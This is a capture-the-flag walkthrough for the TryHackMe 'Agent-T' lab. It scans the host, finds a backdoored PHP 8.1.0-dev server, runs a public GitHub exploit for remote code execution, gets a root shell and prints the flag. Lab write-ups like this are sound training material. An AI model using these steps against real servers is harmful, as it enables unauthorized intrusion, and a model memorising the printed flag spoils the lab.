# Security Misconfiguration

- **IP Target:** `10.10.45.54`
- **Domain Alias:** `agent-t.thm`
- **TryHackMe Lab:** [Agent-T](https://tryhackme.com/room/agentt)

---

### Host Enumeration
- **Update** `/etc/hosts`
- To simplify access using a domain name instead of IP:
```bash
$ echo "10.10.45.54 agent-t.thm" | sudo tee -a /etc/hosts
```

- **Ping the Host**
- Check if the host is reachable:
```bash
$ ping -c 3 agent-t.thm
```
- Result:
```matlab
3 packets transmitted, 3 received, 0% packet loss
```
- The host is up and responsive.

---

### Port Scanning & Service Enumeration

- **RustScan (Fast Port Scanner)**
```bash
$ rustscan -a agent-t.thm -- -A
```
- Results:
    - Open Port: `80/tcp`
    - Service: `HTTP (PHP cli server 5.5 or later — PHP 8.1.0-dev)`
    - Web Page Title: `Admin Dashboard`

- RustScan automatically integrates with Nmap for deeper service and OS detection.

---

### Web Service Analysis

- The web service is running PHP 8.1.0-dev. This is a development version of PHP and may have known vulnerabilities.

---

### Vulnerability Discovery
- **Google Dorking for Known Exploits**
- Use Google to search for public exploits for the PHP version:
```text
site:github.com intitle:PHP 8.1.0-dev inurl:exploit
```

- **Identified Exploit**
- Repository found:
```text
Anasi10/PHP-8.1.0-exploit: Backdoor command execution in PHP 8.1.0-dev
```
- This exploit leverages a backdoor in PHP 8.1.0-dev, which allows for remote code execution.

---

### Exploitation
- **Clone and Execute Exploit**
```bash
$ git clone https://github.com/Anasi10/PHP-8.1.0-exploit.git

$ cd PHP-8.1.0-exploit

$ chmod +x exploit.py

$ ./exploit.py http://agent-t.thm/
```

- **Result: Remote Shell Access**
```bash
$ pwd
/var/www/html

$ whoami
root

$ ls -al /
-rw-rw-r--   1 root root   38 Mar  5  2022 flag.txt

$ cat /flag.txt  
flag{4127d0530abf16d6d23973e3df8dbecb}
```
- We gained root access and captured the flag.

---
